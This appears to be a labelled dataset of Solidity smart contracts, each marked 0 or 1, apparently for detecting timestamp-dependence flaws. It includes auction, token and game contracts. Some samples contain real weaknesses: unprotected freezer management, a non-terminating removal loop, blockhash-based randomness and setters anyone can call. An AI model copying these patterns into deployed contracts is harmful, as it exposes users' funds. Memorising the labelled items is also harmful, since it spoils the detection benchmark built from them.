token.balanceOf(address(this));                 tokenMultiplier = 10 ** uint(token.decimals());        stage = Stages.AuctionSetUp;        Setup();    }                   function changeSettings(        uint _startPrice,        uint _priceDecreaseRate,        uint _endTimeOfBids        )        internal    {        require(stage == Stages.AuctionDeployed || stage == Stages.AuctionSetUp);        require(_startPrice > 0);        require(_priceDecreaseRate > 0);        require(_endTimeOfBids > now);                endTimeOfBids = _endTimeOfBids;        startPrice = _startPrice;        priceDecreaseRate = _priceDecreaseRate;    }              function startAuction() public isOwner atStage(Stages.AuctionSetUp) {        stage = Stages.AuctionStarted;        startTime = now;        startBlock = block.number;        AuctionStarted(startTime, startBlock);    }                   function finalizeAuction() public isOwner atStage(Stages.AuctionStarted) {                 uint missingFunds = missingFundsToEndAuction();        require(missingFunds == 0 || now > endTimeOfBids);                          finalPrice = tokenMultiplier * receivedWei / tokensAuctioned;        finalizedTime = now;        stage = Stages.AuctionEnded;        AuctionEnded(finalPrice);        assert(finalPrice > 0);    }                   function bid()        public        payable        atStage(Stages.AuctionStarted)    {        require(msg.value > 0);        assert(bids[msg.sender] + msg.value >= msg.value);                 uint missingFunds = missingFundsToEndAuction();                          require(msg.value <= missingFunds);        bids[msg.sender] += msg.value;        receivedWei += msg.value;                 walletAddress.transfer(msg.value);        BidSubmission(msg.sender, msg.value, missingFunds,block.timestamp);        assert(receivedWei >= msg.value);    }                   function claimTokens() public atStage(Stages.AuctionEnded) returns (bool) {        return proxyClaimTokens(msg.sender);    }                   function proxyClaimTokens(address receiverAddress)        public        atStage(Stages.AuctionEnded)        returns (bool)    {                                   require(now > finalizedTime + TOKEN_CLAIM_WAITING_PERIOD);        require(receiverAddress != 0x0);        if (bids[receiverAddress] == 0) {            return false;        }        uint num = (tokenMultiplier * bids[receiverAddress]) / finalPrice;                                   uint auctionTokensBalance = token.balanceOf(address(this));        if (num > auctionTokensBalance) {            num = auctionTokensBalance;        }                 fundsClaimed += bids[receiverAddress];                 bids[receiverAddress] = 0;        require(token.transfer(receiverAddress, num));        ClaimedTokens(receiverAddress, num);                          if (fundsClaimed == receivedWei) {            stage = Stages.TokensDistributed;            TokensDistributed();        }        assert(token.balanceOf(receiverAddress) >= num);        assert(bids[receiverAddress] == 0);        return true;    }                             function price() public constant returns (uint) {        if (stage == Stages.AuctionEnded ||            stage == Stages.TokensDistributed) {            return finalPrice;        }        return calcTokenPrice();    }                        function missingFundsToEndAuction() constant public returns (uint) {        uint requiredWei = tokensAuctioned * price() / tokenMultiplier;        if (requiredWei <= receivedWei) {            return 0;        }        return requiredWei - receivedWei;    }                        function calcTokenPrice() constant private returns (uint) {        uint currentPrice;        if (stage == Stages.AuctionStarted) {            currentPrice = startPrice - priceDecreaseRate * (block.number - startBlock);        }else {            currentPrice = startPrice;        }        return currentPrice;    }}
1<CODESPLIT>contract CCCRCoin {  mapping(address => uint256) public holdTime;  function serHoldTime(address _address, uint256 _seconds) external {      holdTime[_address] = block.timestamp + (_seconds);      return;  }}
1<CODESPLIT>contract SaleBalanceTracker {  uint256 public snapshotTimestamp = 0;  bool public locked = false;  function endSale() {    require(!locked);    snapshotTimestamp = block.timestamp;    locked = true;    return;  }}
1<CODESPLIT>contract GameCell {  mapping(address => TimeLock[2]) public allocations;  struct TimeLock {      uint256 releaseTime;      uint256 balance;  }  uint256 total_lockamount = 0;  uint256 total_unlockamount = 0;  function subAllocation(address sender) private {      if (allocations[sender][0].releaseTime < block.timestamp) {          total_unlockamount = total_unlockamount + (allocations[sender][0].balance);      }      else {          total_lockamount = total_lockamount + (allocations[sender][1].balance);      }  }}
0<CODESPLIT>contract ERC721Basic {    function balanceOf(address _owner) public view returns (uint256 _balance);    function ownerOf(uint256 _tokenId) public view returns (address _owner);    function exists(uint256 _tokenId) public view returns (bool _exists);    function approve(address _to, uint256 _tokenId) public;    function getApproved(uint256 _tokenId) public view returns (address _operator);    function transferFrom(address _from, address _to, uint256 _tokenId) public;} 
0<CODESPLIT>contract HorseyExchange is Pausable {      using SafeMath for uint256;    event HorseyDeposit(uint256 tokenId, uint256 price);    event SaleCanceled(uint256 tokenId);    event HorseyPurchased(uint256 tokenId, address newOwner, uint256 totalToPay);         uint256 public marketMakerFee = 3;         uint256 collectedFees = 0;         ERC721Basic public token;         struct SaleData {        uint256 price;        address owner;    }         mapping (uint256 => SaleData) market;         mapping (address => uint256[]) userBarn;         constructor() Pausable() public {    }         function setStables(address _token) external    onlyOwner()    {        require(address(_token) != 0,"Address of token is zero");        token = ERC721Basic(_token);    }         function setMarketFees(uint256 fees) external    onlyOwner()    {        marketMakerFee = fees;    }         function getTokensOnSale(address user) external view returns(uint256[]) {        return userBarn[user];    }         function getTokenPrice(uint256 tokenId) public view    isOnMarket(tokenId) returns (uint256) {        return market[tokenId].price + (market[tokenId].price / 100 * marketMakerFee);    }         function depositToExchange(uint256 tokenId, uint256 price) external    whenNotPaused()    isTokenOwner(tokenId)    nonZeroPrice(price)    tokenAvailable() {        require(token.getApproved(tokenId) == address(this),"Exchange is not allowed to transfer");                 token.transferFrom(msg.sender, address(this), tokenId);                         market[tokenId] = SaleData(price,msg.sender);                 userBarn[msg.sender].push(tokenId);        emit HorseyDeposit(tokenId, price);    }         function cancelSale(uint256 tokenId) external     whenNotPaused()    originalOwnerOf(tokenId)     tokenAvailable() returns (bool) {                 token.transferFrom(address(this),msg.sender,tokenId);                         delete market[tokenId];                 _removeTokenFromBarn(tokenId, msg.sender);        emit SaleCanceled(tokenId);                          return userBarn[msg.sender].length > 0;    }         function purchaseToken(uint256 tokenId) external payable     whenNotPaused()    isOnMarket(tokenId)     tokenAvailable()    notOriginalOwnerOf(tokenId)    {                 uint256 totalToPay = getTokenPrice(tokenId);        require(msg.value >= totalToPay, "Not paying enough");                 SaleData memory sale = market[tokenId];                 collectedFees += totalToPay - sale.price;                 sale.owner.transfer(sale.price);                 _removeTokenFromBarn(tokenId,  sale.owner);                 delete market[tokenId];                          token.transferFrom(address(this), msg.sender, tokenId);                 if(msg.value > totalToPay)          {            msg.sender.transfer(msg.value.sub(totalToPay));        }        emit HorseyPurchased(tokenId, msg.sender, totalToPay);    }         function withdraw() external    onlyOwner()    {        assert(collectedFees <= address(this).balance);        owner.transfer(collectedFees);        collectedFees = 0;    }         function _removeTokenFromBarn(uint tokenId, address barnAddress)  internal {        uint256[] storage barnArray = userBarn[barnAddress];        require(barnArray.length > 0,"No tokens to remove");        int index = _indexOf(tokenId, barnArray);        require(index >= 0, "Token not found in barn");                 for (uint256 i = uint256(index); i<barnArray.length-1; i++){            barnArray[i] = barnArray[i+1];        }                          barnArray.length--;    }         function _indexOf(uint item, uint256[] memory array) internal pure returns (int256){                 for(uint256 i = 0; i < array.length; i++){            if(array[i] == item){                return int256(i);            }        }                 return -1;    }         modifier isOnMarket(uint256 tokenId) {        require(token.ownerOf(tokenId) == address(this),"Token not on market");        _;    }             modifier isTokenOwner(uint256 tokenId) {        require(token.ownerOf(tokenId) == msg.sender,"Not tokens owner");        _;    }         modifier originalOwnerOf(uint256 tokenId) {        require(market[tokenId].owner == msg.sender,"Not the original owner of");        _;    }         modifier notOriginalOwnerOf(uint256 tokenId) {        require(market[tokenId].owner != msg.sender,"Is the original owner");        _;    }         modifier nonZeroPrice(uint256 price){        require(price > 0,"Price is zero");        _;    }         modifier tokenAvailable(){        require(address(token) != 0,"Token address not set");        _;    }}  
0<CODESPLIT>contract EthorseRace {         struct chronus_info {        bool  betting_open;          bool  race_start;          bool  race_end;          bool  voided_bet;          uint32  starting_time;          uint32  betting_duration;        uint32  race_duration;          uint32 voided_timestamp;    }    address public owner;             chronus_info public chronus;         mapping (bytes32 => bool) public winner_horse;              function getCoinIndex(bytes32 index, address candidate) external constant returns (uint, uint, uint, bool, uint);} 
0<CODESPLIT>contract EthorseHelpers {         bytes32[] public all_horses = [bytes32("BTC"),bytes32("ETH"),bytes32("LTC")];    mapping(address => bool) public legitRaces;    bool onlyLegit = false;         function _addHorse(bytes32 newHorse) internal {        all_horses.push(newHorse);    }    function _addLegitRace(address newRace) internal    {        legitRaces[newRace] = true;        if(!onlyLegit)            onlyLegit = true;    }    function getall_horsesCount() public view returns(uint) {        return all_horses.length;    }         function _isWinnerOf(address raceAddress, address eth_address) internal view returns (bool,bytes32)    {                 EthorseRace race = EthorseRace(raceAddress);                        if(onlyLegit)            require(legitRaces[raceAddress],"not legit race");                 bool  voided_bet;          bool  race_end;          (,,race_end,voided_bet,,,,) = race.chronus();                 if(voided_bet || !race_end)            return (false,bytes32(0));                 bytes32 horse;        bool found = false;        uint256 arrayLength = all_horses.length;                 for(uint256 i = 0; i < arrayLength; i++)        {            if(race.winner_horse(all_horses[i])) {                horse = all_horses[i];                found = true;                break;            }        }                 if(!found)            return (false,bytes32(0));                 uint256 bet_amount = 0;        if(eth_address != address(0)) {            (,,,, bet_amount) = race.getCoinIndex(horse, eth_address);        }                         return (bet_amount > 0, horse);    }} 
0<CODESPLIT>contract RoyalStablesInterface {        struct Horsey {        address race;        bytes32 dna;        uint8 feedingCounter;        uint8 tier;    }    mapping(uint256 => Horsey) public horseys;    mapping(address => uint32) public carrot_credits;    mapping(uint256 => string) public names;    address public master;    function getOwnedTokens(address eth_address) public view returns (uint256[]);    function storeName(uint256 tokenId, string newName) public;    function storeCarrotsCredit(address client, uint32 amount) public;    function storeHorsey(address client, uint256 tokenId, address race, bytes32 dna, uint8 feedingCounter, uint8 tier) public;    function modifyHorsey(uint256 tokenId, address race, bytes32 dna, uint8 feedingCounter, uint8 tier) public;    function modifyHorseyDna(uint256 tokenId, bytes32 dna) public;    function modifyHorseyFeedingCounter(uint256 tokenId, uint8 feedingCounter) public;    function modifyHorseyTier(uint256 tokenId, uint8 tier) public;    function unstoreHorsey(uint256 tokenId) public;    function ownerOf(uint256 tokenId) public returns (address);} 
0<CODESPLIT>contract HorseyToken is EthorseHelpers,Pausable {    using SafeMath for uint256;         event Claimed(address raceAddress, address eth_address, uint256 tokenId);             event Feeding(uint256 tokenId);         event ReceivedCarrot(uint256 tokenId, bytes32 newDna);         event FeedingFailed(uint256 tokenId);         event HorseyRenamed(uint256 tokenId, string newName);         event HorseyFreed(uint256 tokenId);         RoyalStablesInterface public stables;         uint8 public carrotsMultiplier = 1;         uint8 public rarityMultiplier = 1;         uint256 public claimingFee = 0.000 ether;         struct FeedingData {        uint256 blockNumber;             uint256 horsey;              }         mapping(address => FeedingData) public pendingFeedings;         uint256 public renamingCostsPerChar = 0.001 ether;         constructor(address stablesAddress)     EthorseHelpers()     Pausable() public {        stables = RoyalStablesInterface(stablesAddress);    }         function setRarityMultiplier(uint8 newRarityMultiplier) external     onlyOwner()  {        rarityMultiplier = newRarityMultiplier;    }         function setCarrotsMultiplier(uint8 newCarrotsMultiplier) external     onlyOwner()  {        carrotsMultiplier = newCarrotsMultiplier;    }         function setRenamingCosts(uint256 newRenamingCost) external     onlyOwner()  {        renamingCostsPerChar = newRenamingCost;    }         function setClaimingCosts(uint256 newClaimingFee) external    onlyOwner()  {        claimingFee = newClaimingFee;    }         function addLegitRaceAddress(address newAddress) external    onlyOwner() {        _addLegitRace(newAddress);    }         function withdraw() external     onlyOwner()  {        owner.transfer(address(this).balance);      }              function addHorseIndex(bytes32 newHorse) external    onlyOwner() {        _addHorse(newHorse);    }         function getOwnedTokens(address eth_address) public view returns (uint256[]) {        return stables.getOwnedTokens(eth_address);    }             function can_claim(address raceAddress, address eth_address) public view returns (bool) {        bool res;        (res,) = _isWinnerOf(raceAddress, eth_address);        return res;    }         function claim(address raceAddress) external payable    costs(claimingFee)    whenNotPaused()    {                 bytes32 winner;        bool res;        (res,winner) = _isWinnerOf(raceAddress, address(0));        require(winner != bytes32(0),"Winner is zero");        require(res,"can_claim return false");                 uint256 id = _generate_special_horsey(raceAddress, msg.sender, winner);        emit Claimed(raceAddress, msg.sender, id);    }         function renameHorsey(uint256 tokenId, string newName) external     whenNotPaused()    onlyOwnerOf(tokenId)     costs(renamingCostsPerChar * bytes(newName).length)    payable {        uint256 renamingFee = renamingCostsPerChar * bytes(newName).length;                 if(msg.value > renamingFee)          {            msg.sender.transfer(msg.value.sub(renamingFee));        }                 stables.storeName(tokenId,newName);        emit HorseyRenamed(tokenId,newName);    }         function freeForCarrots(uint256 tokenId) external     whenNotPaused()    onlyOwnerOf(tokenId) {        require(pendingFeedings[msg.sender].horsey != tokenId,"");                 uint8 feedingCounter;        (,,feedingCounter,) = stables.horseys(tokenId);        stables.storeCarrotsCredit(msg.sender,stables.carrot_credits(msg.sender) + uint32(feedingCounter * carrotsMultiplier));        stables.unstoreHorsey(tokenId);        emit HorseyFreed(tokenId);    }         function getCarrotCredits() external view returns (uint32) {        return stables.carrot_credits(msg.sender);    }         function getHorsey(uint256 tokenId) public view returns (address, bytes32, uint8, string) {        RoyalStablesInterface.Horsey memory temp;        (temp.race,temp.dna,temp.feedingCounter,temp.tier) = stables.horseys(tokenId);        return (temp.race,temp.dna,temp.feedingCounter,stables.names(tokenId));    }         function feed(uint256 tokenId) external     whenNotPaused()    onlyOwnerOf(tokenId)     carrotsMeetLevel(tokenId)    noFeedingInProgress()    {        pendingFeedings[msg.sender] = FeedingData(block.number,tokenId);        uint8 feedingCounter;        (,,feedingCounter,) = stables.horseys(tokenId);        stables.storeCarrotsCredit(msg.sender,stables.carrot_credits(msg.sender) - uint32(feedingCounter));        emit Feeding(tokenId);    }         function stopFeeding() external    feedingInProgress() returns (bool) {        uint256 blockNumber = pendingFeedings[msg.sender].blockNumber;        uint256 tokenId = pendingFeedings[msg.sender].horsey;                 require(block.number - blockNumber >= 1,"feeding and stop feeding are in same block");        delete pendingFeedings[msg.sender];                          if(block.number - blockNumber > 255) {                                      emit FeedingFailed(tokenId);            return false;         }                 if(stables.ownerOf(tokenId) != msg.sender) {                                      emit FeedingFailed(tokenId);            return false;         }                         _feed(tokenId, blockhash(blockNumber));        bytes32 dna;        (,dna,,) = stables.horseys(tokenId);        emit ReceivedCarrot(tokenId, dna);        return true;    }         function() external payable {        revert("Not accepting donations");    }         function _feed(uint256 tokenId, bytes32 blockHash) internal {                 uint8 tier;        uint8 feedingCounter;        (,,feedingCounter,tier) = stables.horseys(tokenId);        uint256 probabilityByRarity = 10 ** (uint256(tier).add(1));        uint256 randNum = uint256(keccak256(abi.encodePacked(tokenId, blockHash))) % probabilityByRarity;                 if(randNum <= (feedingCounter * rarityMultiplier)){            _increaseRarity(tokenId, blockHash);        }                          if(feedingCounter < 255) {            stables.modifyHorseyFeedingCounter(tokenId,feedingCounter+1);        }    }         function _makeSpecialId(address race, address sender, bytes32 coinIndex) internal pure returns (uint256) {        return uint256(keccak256(abi.encodePacked(race, sender, coinIndex)));    }         function _generate_special_horsey(address race, address eth_address, bytes32 coinIndex) internal returns (uint256) {        uint256 id = _makeSpecialId(race, eth_address, coinIndex);                 bytes32 dna = _shiftRight(keccak256(abi.encodePacked(race, coinIndex)),16);                  stables.storeHorsey(eth_address,id,race,dna,1,0);        return id;    }             function _increaseRarity(uint256 tokenId, bytes32 blockHash) private {        uint8 tier;        bytes32 dna;        (,dna,,tier) = stables.horseys(tokenId);        if(tier < 255)            stables.modifyHorseyTier(tokenId,tier+1);        uint256 random = uint256(keccak256(abi.encodePacked(tokenId, blockHash)));                 bytes32 rarityMask = _shiftLeft(bytes32(1), (random % 16 + 240));        bytes32 newdna = dna | rarityMask;          stables.modifyHorseyDna(tokenId,newdna);    }         function _shiftLeft(bytes32 data, uint n) internal pure returns (bytes32) {        return bytes32(uint256(data)*(2 ** n));    }         function _shiftRight(bytes32 data, uint n) internal pure returns (bytes32) {        return bytes32(uint256(data)/(2 ** n));    }         modifier carrotsMeetLevel(uint256 tokenId){        uint256 feedingCounter;        (,,feedingCounter,) = stables.horseys(tokenId);        require(feedingCounter <= stables.carrot_credits(msg.sender),"Not enough carrots");        _;    }         modifier costs(uint256 amount) {        require(msg.value >= amount,"Not enough funds");        _;    }         modifier validAddress(address addr) {        require(addr != address(0),"Address is zero");        _;    }         modifier noFeedingInProgress() {                 require(pendingFeedings[msg.sender].blockNumber == 0,"Already feeding");        _;    }         modifier feedingInProgress() {                 require(pendingFeedings[msg.sender].blockNumber != 0,"No pending feeding");        _;    }         modifier onlyOwnerOf(uint256 tokenId) {        require(stables.ownerOf(tokenId) == msg.sender, "Caller is not owner of this token");        _;    }}  
0<CODESPLIT>contract HorseyPilot {         event NewProposal(uint8 methodId, uint parameter, address proposer);         event ProposalPassed(uint8 methodId, uint parameter, address proposer);              uint8 constant votingThreshold = 2;              uint256 constant proposalLife = 7 days;              uint256 constant proposalCooldown = 1 days;         uint256 cooldownStart;         address public jokerAddress;    address public knightAddress;    address public paladinAddress;         address[3] public voters;         uint8 constant public knightEquity = 40;    uint8 constant public paladinEquity = 10;         address public exchangeAddress;    address public tokenAddress;         mapping(address => uint) internal _cBalance;         struct Proposal{        address proposer;                    uint256 timestamp;                   uint256 parameter;                   uint8   methodId;                    address[] yay;                       address[] nay;                   }         Proposal public currentProposal;         bool public proposalInProgress = false;         uint256 public toBeDistributed;         bool deployed = false;         constructor(    address _jokerAddress,    address _knightAddress,    address _paladinAddress,    address[3] _voters    ) public {        jokerAddress = _jokerAddress;        knightAddress = _knightAddress;        paladinAddress = _paladinAddress;        for(uint i = 0; i < 3; i++) {            voters[i] = _voters[i];        }                 cooldownStart = block.timestamp - proposalCooldown;    }         function deployChildren(address stablesAddress) external {        require(!deployed,"already deployed");                 exchangeAddress = new HorseyExchange();        tokenAddress = new HorseyToken(stablesAddress);                 HorseyExchange(exchangeAddress).setStables(stablesAddress);        deployed = true;    }         function transferJokerOwnership(address newJoker) external     validAddress(newJoker) {        require(jokerAddress == msg.sender,"Not right role");        _moveBalance(newJoker);        jokerAddress = newJoker;    }         function transferKnightOwnership(address newKnight) external     validAddress(newKnight) {        require(knightAddress == msg.sender,"Not right role");        _moveBalance(newKnight);        knightAddress = newKnight;    }         function transferPaladinOwnership(address newPaladin) external     validAddress(newPaladin) {        require(paladinAddress == msg.sender,"Not right role");        _moveBalance(newPaladin);        paladinAddress = newPaladin;    }         function withdrawCeo(address destination) external     onlyCLevelAccess()    validAddress(destination) {                          if(toBeDistributed > 0){            _updateDistribution();        }                         uint256 balance = _cBalance[msg.sender];                         if(balance > 0 && (address(this).balance >= balance)) {            destination.transfer(balance);              _cBalance[msg.sender] = 0;        }    }         function syncFunds() external {        uint256 prevBalance = address(this).balance;        HorseyToken(tokenAddress).withdraw();        HorseyExchange(exchangeAddress).withdraw();        uint256 newBalance = address(this).balance;                 toBeDistributed = toBeDistributed + (newBalance - prevBalance);    }         function getNobleBalance() external view    onlyCLevelAccess() returns (uint256) {        return _cBalance[msg.sender];    }         function makeProposal( uint8 methodId, uint256 parameter ) external    onlyCLevelAccess()    proposalAvailable()    cooledDown()    {        currentProposal.timestamp = block.timestamp;        currentProposal.parameter = parameter;        currentProposal.methodId = methodId;        currentProposal.proposer = msg.sender;        delete currentProposal.yay;        delete currentProposal.nay;        proposalInProgress = true;                emit NewProposal(methodId,parameter,msg.sender);    }         function voteOnProposal(bool voteFor) external     proposalPending()    onlyVoters()    notVoted() {                 require((block.timestamp - currentProposal.timestamp) <= proposalLife);        if(voteFor)        {            currentProposal.yay.push(msg.sender);                         if( currentProposal.yay.length >= votingThreshold )            {                _doProposal();                proposalInProgress = false;                                 return;            }        } else {            currentProposal.nay.push(msg.sender);                         if( currentProposal.nay.length >= votingThreshold )            {                proposalInProgress = false;                cooldownStart = block.timestamp;                return;            }        }    }         function _moveBalance(address newAddress) internal    validAddress(newAddress) {        require(newAddress != msg.sender);          _cBalance[newAddress] = _cBalance[msg.sender];        _cBalance[msg.sender] = 0;    }         function _updateDistribution() internal {        require(toBeDistributed != 0,"nothing to distribute");        uint256 knightPayday = toBeDistributed / 100 * knightEquity;        uint256 paladinPayday = toBeDistributed / 100 * paladinEquity;                 uint256 jokerPayday = toBeDistributed - knightPayday - paladinPayday;        _cBalance[jokerAddress] = _cBalance[jokerAddress] + jokerPayday;        _cBalance[knightAddress] = _cBalance[knightAddress] + knightPayday;        _cBalance[paladinAddress] = _cBalance[paladinAddress] + paladinPayday;                 toBeDistributed = 0;    }         function _doProposal() internal {                 if( currentProposal.methodId == 0 ) HorseyToken(tokenAddress).setRenamingCosts(currentProposal.parameter);                         if( currentProposal.methodId == 1 ) HorseyExchange(exchangeAddress).setMarketFees(currentProposal.parameter);                 if( currentProposal.methodId == 2 ) HorseyToken(tokenAddress).addLegitRaceAddress(address(currentProposal.parameter));                 if( currentProposal.methodId == 3 ) HorseyToken(tokenAddress).addHorseIndex(bytes32(currentProposal.parameter));                 if( currentProposal.methodId == 4 ) {            if(currentProposal.parameter == 0) {                HorseyExchange(exchangeAddress).unpause();                HorseyToken(tokenAddress).unpause();            } else {                HorseyExchange(exchangeAddress).pause();                HorseyToken(tokenAddress).pause();            }        }                 if( currentProposal.methodId == 5 ) HorseyToken(tokenAddress).setClaimingCosts(currentProposal.parameter);                 if( currentProposal.methodId == 8 ){            HorseyToken(tokenAddress).setCarrotsMultiplier(uint8(currentProposal.parameter));        }                 if( currentProposal.methodId == 9 ){            HorseyToken(tokenAddress).setRarityMultiplier(uint8(currentProposal.parameter));        }        emit ProposalPassed(currentProposal.methodId,currentProposal.parameter,currentProposal.proposer);    }         modifier validAddress(address addr) {        require(addr != address(0),"Address is zero");        _;    }         modifier onlyCLevelAccess() {        require((jokerAddress == msg.sender) || (knightAddress == msg.sender) || (paladinAddress == msg.sender),"not c level");        _;    }              modifier proposalAvailable(){        require(((!proposalInProgress) || ((block.timestamp - currentProposal.timestamp) > proposalLife)),"proposal already pending");        _;    }              modifier cooledDown( ){        if(msg.sender == currentProposal.proposer && (block.timestamp - cooldownStart < 1 days)){            revert("Cool down period not passed yet");        }        _;    }         modifier proposalPending() {        require(proposalInProgress,"no proposal pending");        _;    }         modifier notVoted() {        uint256 length = currentProposal.yay.length;        for(uint i = 0; i < length; i++) {            if(currentProposal.yay[i] == msg.sender) {                revert("Already voted");            }        }        length = currentProposal.nay.length;        for(i = 0; i < length; i++) {            if(currentProposal.nay[i] == msg.sender) {                revert("Already voted");            }        }        _;    }         modifier onlyVoters() {        bool found = false;        uint256 length = voters.length;        for(uint i = 0; i < length; i++) {            if(voters[i] == msg.sender) {                found = true;                break;            }        }        if(!found) {            revert("not a voter");        }        _;    }}
1<CODESPLIT>contract Directory {    struct Entry {        string name;        string company;        string description;        string category;        address ethAddress;        uint256 timestamp;        bool deprecated;    }    mapping(address => Entry) public directory;    Entry[] public entries;    function addEntry(string name, string company, string description, string category, address ethAddress) public returns (bool) {        var entry = Entry(name, company, description, category, ethAddress, block.timestamp, false);        directory[ethAddress] = entry;        entries.push(entry);        return true;    }}
0<CODESPLIT>contract DSAuthority {    function canCall(        address src, address dst, bytes4 sig    ) public view returns (bool);}
0<CODESPLIT>contract DSAuthEvents {    event LogSetAuthority (address indexed authority);    event LogSetOwner     (address indexed owner);}
0<CODESPLIT>contract DSAuth is DSAuthEvents {    DSAuthority  public  authority;    address      public  owner;    constructor() public {        owner = msg.sender;        emit LogSetOwner(msg.sender);    }    function setOwner(address owner_)    public    auth    {        owner = owner_;        emit LogSetOwner(owner);    }    function setAuthority(DSAuthority authority_)    public    auth    {        authority = authority_;        emit LogSetAuthority(authority);    }    modifier auth {        require(isAuthorized(msg.sender, msg.sig));        _;    }    function isAuthorized(address src, bytes4 sig) internal view returns (bool) {        if (src == address(this)) {            return true;        } else if (src == owner) {            return true;        } else if (authority == DSAuthority(0)) {            return false;        } else {            return authority.canCall(src, this, sig);        }    }}
0<CODESPLIT>contract DSStop is DSNote, DSAuth {    bool public stopped;    modifier stoppable {        require(!stopped);        _;    }    function stop() public auth note {        stopped = true;    }    function start() public auth note {        stopped = false;    }}
0<CODESPLIT>contract DSMath {    function add(uint x, uint y) internal pure returns (uint z) {        require((z = x + y) >= x);    }    function sub(uint x, uint y) internal pure returns (uint z) {        require((z = x - y) <= x);    }    function mul(uint x, uint y) internal pure returns (uint z) {        require(y == 0 || (z = x * y) / y == x);    }}
0<CODESPLIT>contract Coin is ERC20, DSStop {    string public name;    string public symbol;    uint8 public decimals = 18;    uint256 internal c_totalSupply;    mapping(address => uint256) internal c_balances;    mapping(address => mapping(address => uint256)) internal c_approvals;    function init(uint256 token_supply, string token_name, string token_symbol) internal {        c_balances[msg.sender] = token_supply;        c_totalSupply = token_supply;        name = token_name;        symbol = token_symbol;    }    function() public {        assert(false);    }    function setName(string _name) auth public {        name = _name;    }    function totalSupply() constant public returns (uint256) {        return c_totalSupply;    }    function balanceOf(address _owner) constant public returns (uint256) {        return c_balances[_owner];    }    function approve(address _spender, uint256 _value) public stoppable returns (bool) {        require(msg.data.length >= (2 * 32) + 4);        require(_value == 0 || c_approvals[msg.sender][_spender] == 0);                 require(_value < c_totalSupply);        c_approvals[msg.sender][_spender] = _value;        emit Approval(msg.sender, _spender, _value);        return true;    }    function allowance(address _owner, address _spender) constant public returns (uint256) {        return c_approvals[_owner][_spender];    }}
0<CODESPLIT>contract FreezerAuthority is DSAuthority {    address[] internal c_freezers;         bytes4 constant setFreezingSig = bytes4(0x51c3b8a6);         bytes4 constant transferAndFreezingSig = bytes4(0xb8a1fdb6);    function canCall(address caller, address, bytes4 sig) public view returns (bool) {                 if (isFreezer(caller) && (sig == setFreezingSig || sig == transferAndFreezingSig)) {            return true;        } else {            return false;        }    }    function addFreezer(address freezer) public {        int i = indexOf(c_freezers, freezer);        if (i < 0) {            c_freezers.push(freezer);        }    }    function removeFreezer(address freezer) public {        int index = indexOf(c_freezers, freezer);        if (index >= 0) {            uint i = uint(index);            while (i < c_freezers.length - 1) {                c_freezers[i] = c_freezers[i + 1];            }            c_freezers.length--;        }    }         function indexOf(address[] values, address value) internal pure returns (int) {        uint i = 0;        while (i < values.length) {            if (values[i] == value) {                return int(i);            }            i++;        }        return int(- 1);    }    function isFreezer(address addr) public constant returns (bool) {        return indexOf(c_freezers, addr) >= 0;    }}
1<CODESPLIT>contract LemoCoin is Coin, DSMath {         struct FreezingNode {        uint end_stamp;        uint num_lemos;        uint8 freezing_type;    }         mapping(address => FreezingNode[]) internal c_freezing_list;    constructor(uint256 token_supply, string token_name, string token_symbol) public {        init(token_supply, token_name, token_symbol);        setAuthority(new FreezerAuthority());    }    function addFreezer(address freezer) auth public {        FreezerAuthority(authority).addFreezer(freezer);    }    function removeFreezer(address freezer) auth public {        FreezerAuthority(authority).removeFreezer(freezer);    }    event ClearExpiredFreezingEvent(address indexed addr);    event SetFreezingEvent(address indexed addr, uint end_stamp, uint num_lemos, uint8 indexed freezing_type);    function clearExpiredFreezing(address addr) public {        FreezingNode[] storage nodes = c_freezing_list[addr];        uint length = nodes.length;                 uint left = 0;        while (left < length) {                         if (nodes[left].end_stamp <= block.timestamp) {                break;            }            left++;        }                 uint right = left + 1;        while (left < length && right < length) {                         if (nodes[right].end_stamp > block.timestamp) {                nodes[left] = nodes[right];                left++;            }            right++;        }        if (length != left) {            nodes.length = left;            emit ClearExpiredFreezingEvent(addr);        }    }    function validBalanceOf(address addr) constant public returns (uint) {        FreezingNode[] memory nodes = c_freezing_list[addr];        uint length = nodes.length;        uint total_lemos = balanceOf(addr);        for (uint i = 0; i < length; ++i) {            if (nodes[i].end_stamp > block.timestamp) {                total_lemos = sub(total_lemos, nodes[i].num_lemos);            }        }        return total_lemos;    }    function freezingBalanceNumberOf(address addr) constant public returns (uint) {        return c_freezing_list[addr].length;    }    function freezingBalanceInfoOf(address addr, uint index) constant public returns (uint, uint, uint8) {        return (c_freezing_list[addr][index].end_stamp, c_freezing_list[addr][index].num_lemos, uint8(c_freezing_list[addr][index].freezing_type));    }    function setFreezing(address addr, uint end_stamp, uint num_lemos, uint8 freezing_type) auth stoppable public {        require(block.timestamp < end_stamp);                 require(num_lemos < c_totalSupply);        clearExpiredFreezing(addr);        uint valid_balance = validBalanceOf(addr);        require(valid_balance >= num_lemos);        FreezingNode memory node = FreezingNode(end_stamp, num_lemos, freezing_type);        c_freezing_list[addr].push(node);        emit SetFreezingEvent(addr, end_stamp, num_lemos, freezing_type);    }    function transferAndFreezing(address _to, uint256 _value, uint256 freeze_amount, uint end_stamp, uint8 freezing_type) auth stoppable public returns (bool) {                 require(_value < c_totalSupply);        require(freeze_amount <= _value);        transfer(_to, _value);        setFreezing(_to, end_stamp, freeze_amount, freezing_type);        return true;    }    function transfer(address _to, uint256 _value) stoppable public returns (bool) {        require(msg.data.length >= (2 * 32) + 4);                 require(_value < c_totalSupply);        clearExpiredFreezing(msg.sender);        uint from_lemos = validBalanceOf(msg.sender);        require(from_lemos >= _value);        c_balances[msg.sender] = sub(c_balances[msg.sender], _value);        c_balances[_to] = add(c_balances[_to], _value);        emit Transfer(msg.sender, _to, _value);        return true;    }    function transferFrom(address _from, address _to, uint256 _value) stoppable public returns (bool) {                 require(_value < c_totalSupply);        require(c_approvals[_from][msg.sender] >= _value);        clearExpiredFreezing(_from);        uint from_lemos = validBalanceOf(_from);        require(from_lemos >= _value);        c_approvals[_from][msg.sender] = sub(c_approvals[_from][msg.sender], _value);        c_balances[_from] = sub(c_balances[_from], _value);        c_balances[_to] = add(c_balances[_to], _value);        emit Transfer(_from, _to, _value);        return true;    }}
